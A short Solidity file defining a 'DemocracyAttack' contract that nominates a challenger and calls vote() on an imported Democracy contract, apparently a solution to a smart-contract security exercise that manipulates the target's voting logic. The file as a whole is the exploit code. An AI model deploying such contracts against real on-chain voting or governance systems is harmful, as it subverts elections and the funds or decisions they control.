// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;
import { Democracy } from "./Democracy.sol";

contract DemocracyAttack {
    Democracy democracy;
    address challenger;

    constructor(address _democracy, address _challenger) {
        democracy = Democracy(_democracy);
        challenger = _challenger;
        democracy.nominateChallenger(challenger);
    }
    function attack() public {
        democracy.vote(challenger);
    }

}